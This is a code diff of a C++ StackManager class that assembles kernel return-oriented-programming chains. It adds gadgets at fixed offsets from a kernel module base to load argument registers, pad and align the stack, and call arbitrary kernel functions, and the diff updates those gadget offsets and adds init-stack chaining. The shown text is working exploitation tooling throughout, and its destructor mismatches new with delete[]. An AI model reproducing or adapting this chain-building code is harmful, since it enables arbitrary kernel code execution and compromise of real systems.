@@ -5,19 +5,27 @@
 
 class StackManager
 {
-private:
+protected:
 	std::vector<std::uint64_t>* Stack = nullptr;
+private:
+    StackManager* InitStackManager = nullptr;
+    std::size_t InitStackSize = NULL;
 	std::uintptr_t KernelModuleBase = NULL;
-	std::uintptr_t StackAddress = NULL;
-	std::size_t StackSize = NULL;
+	std::size_t StackSizeLimit = NULL;
+    void ChainStack(StackManager* NewStack);
     void ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue);
 
 public:
-	StackManager(const std::uintptr_t _KernelModuleBase, const std::uintptr_t _StackAddress, const size_t _StackSize = 0x3000)
-		: KernelModuleBase(_KernelModuleBase), StackAddress(_StackAddress), StackSize(_StackSize)
+	StackManager(const std::uintptr_t _KernelModuleBase, StackManager* _InitStackManager = nullptr, const size_t _StackSizeLimit = 0x2000)
+		: KernelModuleBase(_KernelModuleBase), InitStackManager(_InitStackManager), StackSizeLimit(_StackSizeLimit)
 	{
-		Stack = new std::vector<uint64_t>;
-		//Stack->push_back(StackAddress + StackSize);
+		Stack = new std::vector<std::uint64_t>;
+
+        // If an init stack was specified, we must add it prior to the rest of our stack.
+        if (InitStackManager) {
+            this->ChainStack(InitStackManager);
+            this->InitStackSize = this->InitStackManager->GetStackSize();
+        }
 	}
 
 	~StackManager()
@@ -25,8 +33,8 @@ public:
 		delete[] Stack;
 	}
 
-    std::uint64_t* GetStackBuffer();
-    std::size_t GetStackSize();
+    std::uint64_t* GetStackBuffer(const bool IncludeInitStack = false);
+    std::size_t GetStackSize(const bool IncludeInitStack = false);
     void AddGadget(const std::uint64_t GadgetOffset, const std::string_view& GadgetLogName);
     void AddValue(const std::uint64_t Value, const std::string_view& ValueLogName);
     void AddPadding(const std::size_t PaddingSize = 8);
@@ -49,37 +57,37 @@ public:
             // all other args.
             if (ArgCount >= 4)
             {
-                this->AddGadget(0x2f7921, "pop r8; ret;");
+                this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
                 this->AddValue(0, "set r8 to 0");
-                this->AddGadget(0x256c4a, "pop rcx; ret;");
+                this->AddPadding(0x28);
+                this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+                this->AddPadding(0x8);
                 this->AddValue(ConvertedArgs[3], "FourthArg");
-                this->AddGadget(0x51b1da, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");
-            }
-
-            if (ArgCount >= 1)
-            {
-                this->AddGadget(0x256c4a, "pop rcx; ret;"); // pop rcx; ret;
-                this->AddValue(ConvertedArgs[0], "FirstArg");
-            }
-
-            if (ArgCount >= 2)
-            {
-                this->AddGadget(0x3cca89, "pop rdx; ret;"); // pop rdx; ret;
-                this->AddValue(ConvertedArgs[1], "SecondArg");
+                this->AddPadding(0x10);
+                this->AddGadget(0x51838a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");
             }
 
             if (ArgCount >= 3)
             {
-                this->AddGadget(0x2f7921, "pop r8; ret;"); // pop r8; ret;
+                this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
                 this->AddValue(ConvertedArgs[2], "ThirdArg");
+                this->AddPadding(0x28);
             }
+
+            // If we have any args, we can place a value into rcx (arg1) and rdx (arg2) using a single gadget.
+            // The reason this is done instead of a 'pop rcx; ret;' and `pop rdx; ret;` is described in issue #12 on GitHub.
+            this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+            this->AddPadding(0x8);
+            this->AddValue(ConvertedArgs[0], "FirstArg");
+            this->AddValue(ConvertedArgs[1], "SecondArg");
+            this->AddPadding(0x8);
         }
 
         if (this->GetStackSize() % 16 != 0)
             this->AddGadget(0x20043b, "ret (align)");
 
         this->AddGadget(FunctionAddress, "Function to call address");
-        this->AddGadget(0xbad76a, "add rsp, 0x20; ret;");
+        this->AddGadget(0xbac76a, "add rsp, 0x20; ret;");
         this->AddValue(0, "Shadow space 1");
         this->AddValue(0, "Shadow space 2");
         this->AddValue(0, "Shadow space 3");
